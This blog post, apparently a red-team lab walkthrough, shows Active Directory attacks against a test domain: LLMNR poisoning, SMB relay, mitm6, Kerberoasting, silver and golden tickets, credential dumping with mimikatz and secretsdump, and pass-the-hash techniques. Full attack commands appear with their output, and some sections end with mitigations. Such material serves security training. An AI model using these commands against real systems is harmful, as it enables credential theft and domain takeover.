---
title: Active Directory Attacks
author: Muhammad Adel
date: 2021-06-25 18:45:00 +0200
categories: [Active Directory 101]
tags: [active directory, red team]
---

## **LLMNR Poisoning**

It stands for Link-Local Multicast Name Resolution. it acts as a host discovery/identification method in windows systems. LLMNR and NBT-NS (NetBios Name System)are used as an alternative for Domain Name System (DNS) and can identify other hosts in same local link or network.


**Demonstration**

![LLMNR Poisoning](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGTzH4bB3g4gm9XMtQi%2Fllmnr.png?alt=media&token=5e7d8239-cf0d-4769-84de-9963c7ef38df)


So let's stimulate this.

First run Responder with the following parameters.

![Responder](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGTzjgq_Zx-h6iJKG5F%2Fres1.png?alt=media&token=87c2fa1e-f31e-4e81-b635-477867e87c7d)


Then go to your windows client machine and stimulate that you are the victim and make a connection to your attacking machine which is undefined in their DNS.

![Send the hash to the attacker](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGU-DIAUP4vyO37e-lz%2Fres2.png?alt=media&token=dfad225d-46c7-434d-9624-78e0bd34a81c)


then back to listener (Responder) and you will see the hash of the victim machine.

![Victim's Hash](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGU-aFYDXKx1XIhes8y%2Fres3.png?alt=media&token=ef4daebe-8193-4885-91f0-8ca7eda16537)


### **Mitigation**

**1.**  Disable LLMNR and NBT-NS.

**2.**  Install a Network access control.



## **SMB Relay**

Instead of cracking hashes gathered with responder, we can relay those hashes to specific machine and gain access.

for more info check this link

[SANS Penetration Testing blog pertaining to SMB Relay Demystified and NTLMv2 Pwnage with Python](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)

Also to demonstrate what happens behind the scene take a look at those.

![SANS: smb auth in normal mode](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ-A4iRsSuu7skv_P_%2Fsans1.png?alt=media&token=73bba686-1b68-4aae-be85-d2cdd2262e13)


![SANS: SMB AUTH in attacking mode](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ-HFpGauFKYhoPbxR%2Fsans2.png?alt=media&token=55ef2253-5504-49f9-a8b0-cbdbf011f6ba)


**Attack requirements**


**1.**  SMB signing must be disabled on the target.

**2.** Relayed user must be Admin on the targeted machine.

**Discovering Hosts with SMB Signing Disabled**

we will use nmap for this phase.

![SMB Signing Disabled](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2DYscj-wuSAEuK7b%2Fsmb1.png?alt=media&token=9aa4e53e-c622-477b-a2cf-b81461f72488)

Now, we know that our target's smb signing is disabled so let's start our attack.

First, Edit our *Responder.conf* and disable SMB and HTTP server.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2b7vtrnxjCGxdWQ6%2Fsmr4.png?alt=media&token=dae12429-2c22-4037-8668-9e7dd414700e)

Then let's fire up Responder.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3Ar-BQXnbU2FF1i4%2Fsbmr5.png?alt=media&token=d4dd62e1-99fd-4608-ace4-f93347f44be6)

Then, Fire up our relay using ntlmrelayx.py.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2xpfkidIYc2pbokG%2Fsmbr6.png?alt=media&token=f5da87c0-fb74-448b-a6b5-12019d80638e)

Then let's fake the connections from the victim machine.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3Jq-vGKMIxRvyn34%2Fsmb7.png?alt=media&token=08222d29-157c-4750-9c0e-ce26586053d5)

Back to our relay, we have got an NTLM hashes from the SAM file.

![Reading the SAM file](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3eMt6RS8TrIy-mnw%2Fsmbr8.png?alt=media&token=89eb6577-299e-497a-8157-593b5022414c)

**Getting an smb shell via smb relay**

the same method we have did before but we are going to add -i option to our relay.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ46gmVVT3DOfnijzb%2Fsmbshell1.png?alt=media&token=cae26b0f-8c80-4bb2-b9f0-861a68475663)

Again let's fake the connection from the victim machine.

![Got smb shell](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ4MU977kPivcWzMp8%2Fsmbshell2.png?alt=media&token=691af024-cdcd-453e-9ad9-e33b7585931c)

Now our relay have established an smb shell to us on port 11000, So let's connect to it through netcat.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ420ArNQ9WQ56uMem%2Fsmbaccess.png?alt=media&token=c273d367-2b64-4580-9db9-dcb2d183dee4)

**Mitigation**

**1.**  Enable smb signing on all devices.

**2.**  Disable NTLM authentication on the network.

**3.**  Account tiering: which to limit the domain administrators to only login to their domain accounts.

**4.**  Local Admin restrictions

‌

## **IPV6 Attacks**

**Primary DNS takeover via mitm6**

mitm6 starts with listening on the primary interface of the attacker machine for Windows clients requesting an IPv6 configuration via DHCPv6. mitm6 will reply to those DHCPv6 requests, assigning the victim an IPv6 address within the link-local range.

**Demonstration**

First, let's set up Mitm6 and the relay.

![MITM6](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvLEFGZtywZd0ad1_%2FIPV6%20Attack%202%20.png?alt=media&token=c1ffd74a-ff30-42b9-9d0b-b7c9f55bb2f6)

![Relay](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvFv7BiyNg23no4PM%2FIPV6%20Attack.png?alt=media&token=3f36700a-5b93-4246-992c-9669fd27d1df)

Then, let's simulate the attack by restarting our victim machine. then we will find that the machine has been assigned an IPV6 address. So any connection with IPV6 will come back to us on the relay which will dump many information by this way.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvxBSBjku428XUW1q%2FIPV6%20Attack%203.png?alt=media&token=02bfabe4-a86f-478e-bb7a-850f1e9f45ef)

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAw0i6w1J3gC_-04nr%2FIPV6%20Attack%204%20.png?alt=media&token=766b3dac-4746-4980-ad51-456855164ddf)

**Mitigation**

**1.**  Disable IPv6.

**2.**  Disable WPAD if it not in use.

**3.**  Enable LDAP signing and LDAP channel binding.

## **Kerberos Attacks**

### **Kerbroasting**

If you got a valid domain user, you may just ask the KDC to issue you a valid TGS for any service. Knowing the fact that SPN attributes can be set to a specific username, and that the TGS is encrypted using service's key (user's key in that case) We can issue a TGS ticket on our own machine, dump the ticket and start an offline brute force attack against it to retrieve the plain text password for that user (service account)! that is called Kerbroasting.


```bash
root@kali: GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.219.131 -request
```
![Request a TGS](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMGv-KTe0aJT3rkSJfP%2FKerberoasting%201.png?alt=media&token=693eeed7-7d29-4acc-b65a-b89fff801ecd)

Then after that we can crack the ticket offline and retrieving the password of the service.

```bash
root@kali: hashcat --help |  grep  "TGS"

 13100 | Kerberos 5, etype 23, TGS-REP | Network Protocols
 19600 | Kerberos 5, etype 17, TGS-REP | Network Protocols
 19700 | Kerberos 5, etype 18, TGS-REP | Network Protocols
root@kali: hashcat -m 13100 TGS_Ticket.txt
```

**Anther way**

We can call the KerberosRequestorSecurityToken constructor by specifying the SPN with the - ArgumentList option as shown in Listing.
`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SQLSERVICE/Marvel.local'`

```c
PS C:\Users\offsec.CORP> klist
Current LogonId is 0:0x3dedf
Cached Tickets:  (4)
#1> Client: fcastle @ Mrvel.local
Server: SQLSERVICE/Marvel.local @ Marvel.local
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40a50000  -> forwardable renewable pre_authent ok_as_delegate name_c
ano
Start Time:  2/12/2018  10:18:31  (local)
End Time:  2/12/2018  20:17:53  (local)
Renew Time:  2/19/2018  10:17:53  (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags:  0
Kdc Called: PDC.Marvel.local
PS C:\Users\offsec.CORP> klist /export
```

If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as **Kerberoasting**), we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do not need administrative privileges for this attack.

```bash
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Fcastle@SQLSERVICE~Marvel.local.kirbi

found password for ticket 0: MYpassword123 File: 1-40a50000-Fcastle@SQLSERVICE~Marvel.local.kirbi
All tickets cracked!
```


### **Silver Tickets**

Since we have divided the kerberos Authentication into two parts. the first one is AS-REQ, AS-REP and TGS-REQ, TGS-REP. The 2nd part is client - service which is the more interesting part for the silver ticket. To authenticate to the service, the client sends a copy of the **TGS Ticket (Service Ticket)** which is encrypted using the service Secret key and the User Authenticator message which is encrypted using the Service Session Key. So the actual service authentication part 2, and all it's needed is the service secret key. if you have a service secret key, you may just create a random session key, add it to your own Service ticket, encrypt it with the service's secret, and send it to the service while authenticating. As all the service will do is just trying to decrypt that ticket with its own key, which will work because it's the same key you used while encrypting the ticket, then use the session key (which you generated) to decrypt the Authenticator Message.

![2nd part Client <-> Service](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MLleHggLGDNZw31DXUz%2F-MLmYiQ3MvFE4GNjUH2m%2F9%20-%20From%20User%20to%20Serivce.png?alt=media&token=c246217c-d3b4-454f-8505-4aaad3e678a5)

Before we launch the attack we need to target a specific **service** and grab its **password** and its **NTLM** hash. we can achieve this by targeting any service account and launch a kerberos attack on it to crack its password. So now let's assume we have all of these and we ready to create a silver ticket.

First, open mimkatz and run the following command:

`kerberos::golden /user:administrator /domain:jnkfo.lab /sid:S-1-5-21-3178339118-3033626349-2532976716 /target:win10.jnkfo.lab /rc4:1ad9c160bd7ab9cb4b7c890c96862305 /service:cifs`

‌
-   user: Username, this can be any user, even invalid one will work.

-   domain: The domain name

-   sid: Domain sid, can be obtained via many methods, whoami /user is one.

-   target: Target machine

-   rc4: NTLM hash of the target service

-   Service: The service name, cifs as am accessing file sharing service

![Silver Ticket](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MM5L2otAhLKk5Al_W5g%2F-MM5x0uBcljzME7V1x8m%2FSilver%20tICKET%202.png?alt=media&token=eda2081b-8bb2-4079-97a4-a32a415c1e70)

Now, we have got a Silver ticket to access file share on the win10.jnkfo.lab machine.

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MM5L2otAhLKk5Al_W5g%2F-MM5xgD5XBm-ZuG6UWU_%2FSilver%20tICKET%203.png?alt=media&token=b7eb8bf2-b14c-4184-a3a3-884fcea8e644)


### Golden Tickets

Golden ticket attack takes part in (TGS-REQ). The TGT is encrypted using the KRBTGT account (TGS Secret Key), KDC will decrypt this and issue the service ticket with the same group memberships and validation info found in the TGT. So, if you have the KRBTGT hash, you can forge your own TGT which includes the PAC data with any group membership you want! including domain admins! sending this to the KDC will result in a service ticket with a domain admin group membership inside!

![TGS REQ](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MLleHggLGDNZw31DXUz%2F-MLmBfOvr7TahzDKtIgq%2F5%20-%20USER%20to%20TGT.png?alt=media&token=620beda8-59f3-4bb0-9253-9a8172937455)

To grab the needed information we will use the following command


```c
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166
RID :  000001f6  (502)
User : krbtgt
  * Primary
 NTLM :  5508500012cc005cf7082a9a89ebdfdf
 LM :
 Hash NTLM:  5508500012cc005cf7082a9a89ebdfdf
 ntlm-  0:  5508500012cc005cf7082a9a89ebdfdf
 lm -  0:  372f405db05d3cafd27f8e6a4a097b2c
```

![Golden Ticket needed information](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHHRakx2AaYACrfooE%2FGolden%20Ticket%20MIMKATZ.png?alt=media&token=b85f8d41-4f46-49a1-9af6-577e31af0542)

the same command but without /service.

`mimikatz # kerberos::golden /user:anyuser /domain:domainname /sid:DomainSID /krbtgt:TGT-NTLM-Hash /id:userid`


```c
mimikatz # kerberos::golden /user:Administrator /domain:Controller.local /sid:S-1-5-21-849420856-2351964222-986696166  /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
User : Administrator
Domain : Controller.local (CONTROLLER)
SID : S-1-5-21-849420856-2351964222-986696166
User Id :  500
Groups Id :  *513  512  520  518  519
ServiceKey:  5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime :  11/16/2020  10:10:20 AM ;  11/14/2030  10:10:20 AM ;  11/14/2030  10:10:20 AM

-> Ticket : ticket.kirbi
  * PAC generated
  * PAC signed
  * EncTicketPart generated
  * EncTicketPart encrypted
  * KrbCred generated

Final Ticket Saved to file !
```

Then we will use this golden ticket to access other machines.

```c
mimikatz # misc::cmd
Patch OK for  'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF63A5543B8
```
‌
You will now have another command prompt with access to all other machines on the network

![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHH-1UBR79C5s9Z76w%2Faa.png?alt=media&token=f3c6617e-c59c-4902-8a48-16328d091cbf)



![](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHH1SXjrqgT9KBvfDT%2Faa2.png?alt=media&token=7acd82de-dbaa-49b5-8bde-aee95255e2ea)



## **Lateral Movement**

### **Cached Credential Storage and Retrieval**

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the **Local Security Authority Subsystem Service (LSASS)** memory space. the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.

we will use Mimikatz to extract hashes.

Since the Fcastle domain user is a local administrator, we are able to launch a command prompt with elevated privileges. From this command prompt, we will run mimikatz and enter **privilege::debug** to engage the **SeDebugPrivlege** privilege, which will allow us to interact with a process owned by another account. Finally, we'll run **sekurlsa::logonpasswords** to dump the credentials of all logged-on users using the **Sekurlsa** module. This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.


```c
C:\> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 291668 (00000000:00047354)
Session : Interactive from 1
User Name : Offsec
Domain : CORP
Logon Server : DC01
Logon Time : 08/02/2018 14.23.26
SID : S-1-5-21-1602875587-2787523311-2599479668-1103
msv :
[00000003] Primary
\* Username : fcastle
\* Domain : MARVEL
\* NTLM : e2b475c11da2a0748290d87aa966c327
\* SHA1 : 8c77f430e4ab8acb10ead387d64011c76400d26e
\* DPAPI : 162d313bede93b0a2e72a030ec9210f0
tspkg :
wdigest :
\* Username : fcastle
\* Domain : MARVEL
\* Password : (null)
kerberos :
\* Username : fcastle
\* Domain : MARVEL.COM
\* Password : (null)
```
‌
Also, we will use Mimikatz to exploit Kerberos authentication by abusing TGT and service tickets. We know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.

```c
mimikatz # sekurlsa::tickets
Authentication Id : 0 ; 291668 (00000000:00047354)
Session : Interactive from 1
User Name : fcasle
Domain : MARVEL
Logon Server : DC01
Logon Time : 08/02/2018 14.23.26
SID : S-1-5-21-1602875587-2787523311-2599479668-1103
* Username : fcastle
* Domain : MARVEL.COM
* Password : (null)
Group 0 - Ticket Granting Service
[00000000]
Start/End/MaxRenew: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47
Service Name (02) : cifs ; dc01 ; @ CORP.COM
Target Name (02) : cifs ; dc01 ; @ CORP.COM
Client Name (01) : Offsec ; @ CORP.COM
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
Session Key : 0x00000012 - aes256_hmac
d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718
Ticket : 0x00000012 - aes256_hmac ; kvno = 3 [...]
Group 1 - Client Ticket ?
```

### **Pass The Password**

In this technique, you are having a valid username and password on one machine. So we are going to pass the password to the whole machines in the domain to see if this user has access over anther machines or not.

```c
root@kali: crackmapexec smb 192.168.219.0/24 -u fcastle -d MARVEL.local -p Password1
SMB         192.168.219.131 445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.219.130 445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.219.132 445    SPIDERMAN        [*] Windows 10.0 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.219.131 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         192.168.219.130 445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.219.132 445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```

Now, we have got an access with the same user on anther machine SPIDERMAN.

### **Dumping Hashes**

**Using scretdump.py**

```bash
root@kali: secretsdump.py marvel/fcastle:Password1@192.168.219.130
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf604419dffcf03f36a1eaf70ceeb5808
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:81483d09ad1125d52a72c6ab40ded2f5:::
Muhammad:1001:aad3b435b51404eeaad3b435b51404ee:acbc1d7e615194dfb894cb03e0a9c91f:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#35763304a8f65310e97fc21285d3184d
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:88dec67ed91edafad653edf12abc5ab4fad7b5801dcfae25190b85b758be78f0
MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:3a62a3f16b6f5c661e79009dd52652bd
MARVEL\THEPUNISHER$:des-cbc-md5:38b067ad8097abd0
MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:3b12aad6f5746a2de05b7a8b18d76dd2:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x733cfa0609e7af0b93b12be1b3ef343eb8ac95bf
dpapi_userkey:0x76667049c9be8cb6bdf731f27f9c798f38492637
[*] NL$KM 
 0000   BA 6B FB 0C 66 FE 19 5E  C3 15 CD 43 7C 66 81 D3   .k..f..^...C|f..
 0010   CB A9 10 7F F4 6B 74 CD  66 88 E1 7E 2F 0E F4 46   .....kt.f..~/..F
 0020   73 08 AF 6D 08 72 07 91  B1 C3 4B 07 11 AE 1D 64   s..m.r....K....d
 0030   59 72 2D 78 CA A7 CC 7A  ED 62 D7 F1 5B 51 0F A2   Yr-x...z.b..[Q..
NL$KM:ba6bfb0c66fe195ec315cd437c6681d3cba9107ff46b74cd6688e17e2f0ef4467308af6d08720791b1c34b0711ae1d6459722d78caa7cc7aed62d7f15b510fa2
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
###

Using Mimikatz

```c
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 283655 (00000000:00045407)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/16/2020 9:46:09 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DOMAIN-CONTROLL$
         * Domain   : CONTROLLER
         * NTLM     : 4bd04581d16353e6bf64ba9745cb6a8f
         * SHA1     : 61f1c5a4691ad30c67adf2a371fafda0178a7b2b
        tspkg :
        wdigest :
         * Username : DOMAIN-CONTROLL$
         * Domain   : CONTROLLER
         * Password : (null)
        kerberos :
         * Username : DOMAIN-CONTROLL$
         * Domain   : CONTROLLER.local
         * Password : 32 af 6b 07 78 2a f0 f5 32 bd 01 59 fb 6b 40 10 6e a7 03 f9 ec d8 23 de 6a 08 10 10 74 b5 60 bb f4 c5 2e 5f 42 e3 71 8b 4b 41 31 2f d2 17 db 2c e1 c3 d7 51 0f 45 79 e4 9a ec ab 63 bb 4a ce c1 dc 20 28 6d c7 50 a0 28 03 a4 7b c1 02 d8 3b c6 19 09 31 8c 41 90 c6 20 fa c4 7b ef 4b cf c1 86 c7 95 f9 60 8d 35 8d 10 c8 ee 37 54 45 3e 30 30 92 b1 b3 85 e3 bd e7 55 22 88 36 82 95 a7 db 71 fa b7 50 1d ce 08 6b 77 9d 02 dd 68 8f f7 ed 1e ac 56 c5 3f c3 e1 cb ba ef 01 79 0c d4 cb b2 36 40 12 2d 36 6a a5 92 78 8c bf 44 c2 28 27 de 00 68 06 3c 4d dc 15 44 5e 81 f8 26 19 e7 0c ca 3e e3 f3 d8 ab ee cb 01 8e 7c 9f ba b4 66 dc 66 af 9c 6d 99 8b c8 fb 02 bd 3f 45 d7 3f 42 e3 e8 4c 25 7e 72 48 b5 38 a8 33 94 20 5e 3d b8 c6 66 93
        ssp :
        credman :
    
```

```c
mimikatz # lsadump::lsa /patch
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe
```
‌

### **Pass The Hash**

The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.

the hash that we will try

```bash
Muhammad:acbc1d7e615194dfb894cb03e0a9c91f
root@kali: crackmapexec smb 192.168.219.0/24 -u "Muhammad" -H acbc1d7e615194dfb894cb03e0a9c91f --local-auth
SMB         192.168.219.132 445    SPIDERMAN        [*] Windows 10.0 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.219.131 445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.219.130 445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.219.132 445    SPIDERMAN        [+] SPIDERMAN\Muhammad acbc1d7e615194dfb894cb03e0a9c91f 
SMB         192.168.219.131 445    HYDRA-DC         [-] HYDRA-DC\Muhammad:acbc1d7e615194dfb894cb03e0a9c91f STATUS_LOGON_FAILURE 
SMB         192.168.219.130 445    THEPUNISHER      [+] THEPUNISHER\Muhammad acbc1d7e615194dfb894cb03e0a9c91f 
```

![Pass The Hash](https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMBOY20_X9iTk49o0V1%2F-MMBVv4UaWyT775Q9OGH%2FPass%20the%20hash.png?alt=media&token=a9bb1839-2d55-4041-9060-675c75bac5dd)


### **Overpass The Hash**

In some cases, if you got the user's hash you may not be able to crack it or use it in pass the hash attack for many reasons. example: disabled NTLM authentication. The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.let's Assume first that we are on anther machine (SPIDERMAN) as **ppraker** user. and we want to gain access to **fcastle** user only with his NTLM hash. A simple way to do this is again with the **sekurlsa::pth** command from Mimikatz.

```c
mimikatz # sekurlsa::pth /user:fcatle /domain:Marvel.local /ntlm:e2b475c11da2a0748290d
87aa966c327 /run:PowerShell.exe
user : fcastle
domain : Marvel.local
program : cmd.exe
impers. : no
NTLM : e2b475c11da2a0748290d87aa966c327
| PID 4832
| TID 2268
| LSA Process is now R/W
| LUID 0 ; 1197687 (00000000:00124677)
\_ msv1_0 - data copy @ 040E5614 : OK !
\_ kerberos - data copy @ 040E5438
\_ aes256_hmac -> null
\_ aes128_hmac -> null
\_ rc4_hmac_nt OK
\_ rc4_hmac_old OK
\_ rc4_md4 OK
\_ rc4_hmac_nt_exp OK
\_ rc4_hmac_old_exp OK
\_ *Password replace -> null

```
Now, we have a new PowerShell session that allows us to execute commands as **facstle**. So let's make any kerberos connection to cache our TGT ticket.

```
PS C:\Windows\system32> klist
Current LogonId is 0:0x1583ae
Cached Tickets: (0)
PS C:\Windows\system32> net use \\SPIDERMAN
The command completed successfully.
PS C:\Windows\system32> klist
Current LogonId is 0:0x1583ae
Cached Tickets: (3)
#0> Client: fcastle @ Marvel.local
Server: krbtgt/Marvel.local @ Marvel.local
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canoni
Start Time: 2/12/2018 13:59:40 (local)
End Time: 2/12/2018 23:59:40 (local)
Renew Time: 2/19/2018 13:59:40 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0x2 -> DELEGATION
Kdc Called: DC01.corp.com
#1> Client: jeff_admin @ CORP.COM
Server: krbtgt/CORP.COM @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonica
```

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of fcastle in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller. Let's try that now, running ./PsExec.exe to launch cmd.exe remotely on the \\THEPHUNISHER machine as fcastle:

```c
PS C:\Tools\active_directory> .\PsExec.exe \\THEPHUNISHER cmd.exe
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
C:\Windows\system32> whoami
marvel\fcastle
```

## **Credits**

As we went through this serias we used many resources to help us create our serias. Thanks a lot ot all of these resources for helping me creating this.

[adsecurity.org](https://adsecurity.org/)

[Redforce -- Always Stay Ahead!](https://blog.redforce.io/)

[TryHackMe](https://tryhackme.com/room/attackingkerberos)

[Kerberos authentication](https://docs.axway.com/bundle/APIGateway_762_IntegrationKerberos_allOS_en_HTML5/page/Content/KerberosIntegration/kerberos_overview.htm)

[@dewni.matheesha](https://medium.com/@dewni.matheesha/kerberos-the-computer-network-authentication-protocol-a198309339b7)

[Destination Certification](https://www.youtube.com/watch?v=5N242XcKAsM)